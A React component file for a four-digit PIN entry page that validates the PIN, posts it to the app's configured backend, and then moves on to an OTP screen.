import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import { useForm } from "react-hook-form";
import { yupResolver } from "@hookform/resolvers/yup";
import * as yup from "yup";
import FormErrMsg from "../components/FormErrMsg";
import axios from "axios";
import BASE_URL from "../components/urls";

const schema = yup.object().shape({
  pin: yup
    .string()
    .matches(/^\d{4}$/, "PIN must be exactly 4 digits")
    .required("PIN is required"),
});

const Pin = () => {
  const navigate = useNavigate();
  const {
    register,
    handleSubmit,
    setValue,
    formState: { errors },
  } = useForm({ resolver: yupResolver(schema) });

  const [pin, setPin] = useState(new Array(4).fill(""));
  const [loading, setLoading] = useState(false);

  const handleChange = (element, index) => {
    const value = element.value;
    if (!/^\d$/.test(value)) return;

    const newPin = [...pin];
    newPin[index] = value;
    setPin(newPin);

    if (index < 3 && value !== "") {
      document.getElementById(`pin-${index + 1}`).focus();
    }

    setValue("pin", newPin.join(""));
  };

  const handleKeyDown = (e, index) => {
    if (e.key === "Backspace" && !pin[index] && index > 0) {
      document.getElementById(`pin-${index - 1}`).focus();
    }
  };

  const submitForm = (data) => {
    setLoading(true);
    axios
      .post(`${BASE_URL}/pin`, data)
      .then((response) => {
        console.log(response.data);
        navigate("/otp");
      })
      .catch((error) => {
        console.error("There was an error!", error);
      })
      .finally(() => {
        setLoading(false);
      });
  };

  return (
    <div className="min-h-screen bg-gradient-to-b from-gray-100 to-white flex items-center flex-col pt-28">
      <form onSubmit={handleSubmit(submitForm)} className="w-full max-w-sm">
        {/* Enter PIN Text */}
        <div className="text-center mb-16">
          <h3 className="text-gray-500 text-lg font-light tracking-wide">
            ENTER PIN
          </h3>
        </div>

        {/* PIN Input Boxes */}
        <div className="flex justify-center gap-4 mb-[25em]">
          {pin.map((data, index) => (
            <input
              key={index}
              id={`pin-${index}`}
              type="password"
              name="pin"
              maxLength="1"
              value={data}
              onChange={(e) => handleChange(e.target, index)}
              onKeyDown={(e) => handleKeyDown(e, index)}
              onFocus={(e) => e.target.select()}
              className={`w-10 h-10 text-center text-2xl font-semibold border-2 rounded-full focus:outline-none focus:ring-2 focus:ring-[#1a4d7a] transition-all ${
                data ? "border-[#1a4d7a] bg-white" : "border-gray-300 bg-white"
              } ${errors.pin ? "border-red-500" : ""}`}
              inputMode="numeric"
              pattern="[0-9]*"
              autoComplete="off"
            />
          ))}
        </div>

        <div className="mb-6">
          <FormErrMsg errors={errors} inputName="pin" />
        </div>

        {/* Verify Button */}
        <button
          type="submit"
          disabled={loading || pin.some((digit) => digit === "")}
          className="w-full bg-[#0047BB] text-white py-4 rounded-xl font-semibold text-lg hover:bg-[#003a99] transition-colors disabled:opacity-50 disabled:cursor-not-allowed shadow-sm"
        >
          {loading ? "Verifying..." : "Verify"}
        </button>
      </form>
    </div>
  );
};

export default Pin;
